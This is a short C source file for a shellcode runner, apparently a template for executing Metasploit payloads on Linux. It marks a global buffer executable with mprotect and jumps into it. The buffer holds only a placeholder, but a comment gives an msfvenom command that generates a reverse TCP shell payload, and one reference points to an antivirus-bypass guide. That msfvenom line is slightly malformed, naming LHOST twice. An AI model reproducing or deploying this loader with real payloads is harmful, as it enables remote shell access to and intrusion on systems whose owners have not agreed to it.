/*

Simple ELF shellcode runner

Reference:
	* https://tuttlem.github.io/2017/10/28/executing-shellcode-in-c.html 
	* https://stackoverflow.com/questions/27900201/create-and-test-x86-64-elf-executable-shellcode-on-a-linux-machine
	* https://man7.org/linux/man-pages/man2/mprotect.2.html
	* https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates
*/
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>

#define SCSSIZE 1024

// handcrafted payload here
// msfvenom -p linux/x86/shell/reverse_tcp LHOST=4444 LHOST=127.0.0.1 -f c
unsigned char PAYLOAD[SCSSIZE] = "__SHELLCODE__";

// msf template below
//unsigned char PAYLOAD[SCSSIZE] = "PAYLOAD: ";

typedef int (*shellcode_func)();

int main(int argc, char *argv[]) {
	// create executable memory
  mprotect((void*)((intptr_t)PAYLOAD & ~0xFFF), SCSSIZE, PROT_READ|PROT_EXEC|PROT_WRITE);  
  shellcode_func exeshell = (shellcode_func) PAYLOAD;  
  exeshell(); // execute shellcode	
  return 0;
}